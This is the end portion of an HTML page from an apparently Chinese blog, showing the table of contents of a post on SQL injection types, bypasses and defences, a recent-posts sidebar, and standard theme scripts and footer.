class="toc-number">1.1.8.</span> <span class="toc-text">堆叠注入:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E6%B3%A8%E5%85%A5-1"><span class="toc-number">1.1.9.</span> <span class="toc-text">函数注入:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5-1"><span class="toc-number">1.1.10.</span> <span class="toc-text">宽字节注入:</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.11.</span> <span class="toc-text">防御布尔注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%B2%E8%8C%83SQL%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.12.</span> <span class="toc-text">防范SQL联合查询注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.1.13.</span> <span class="toc-text">防御时间盲注</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">SQL注入绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%9C%89%E5%93%AA%E4%BA%9B%E5%8D%B1%E5%AE%B3%EF%BC%9F"><span class="toc-number">3.</span> <span class="toc-text">SQL注入有哪些危害？</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8BSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.0.1.</span> <span class="toc-text">数字型SQL注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E5%9E%8BSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.0.2.</span> <span class="toc-text">布尔型SQL注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8BSQL"><span class="toc-number">3.0.3.</span> <span class="toc-text">字符型SQL</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%9E%8BSQL"><span class="toc-number">3.0.4.</span> <span class="toc-text">搜索型SQL</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/12/04/hello-world/" title="Hello World">Hello World</a><time datetime="2023-12-04T06:54:55.398Z" title="发表于 2023-12-04 14:54:55">2023-12-04</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/30/12.SQL%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B/" title="SQL注入">SQL注入</a><time datetime="2023-11-29T16:00:00.000Z" title="发表于 2023-11-30 00:00:00">2023-11-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/30/1.SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/" title="SQL注入学习">SQL注入学习</a><time datetime="2023-11-29T16:00:00.000Z" title="发表于 2023-11-30 00:00:00">2023-11-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/30/13.SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/" title="SQL报错注入">SQL报错注入</a><time datetime="2023-11-29T16:00:00.000Z" title="发表于 2023-11-30 00:00:00">2023-11-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/30/12.SQl%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/" title="SQL注入原理">SQL注入原理</a><time datetime="2023-11-29T16:00:00.000Z" title="发表于 2023-11-30 00:00:00">2023-11-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023</div><!--  .framework-info--><!--    span= _p('footer.framework') + ' '--><!--    a(href='https://hexo.io')= 'Hexo'--><!--    span.footer-separator |--><!--    span= _p('footer.theme') + ' '--><!--    a(href='https://github.com/jerryc127/hexo-theme-butterfly')= 'Butterfly'--><!--  .footer_custom_text!=`${theme.footer.custom_text}`--></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script src="/js/weibo.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div></div></body></html>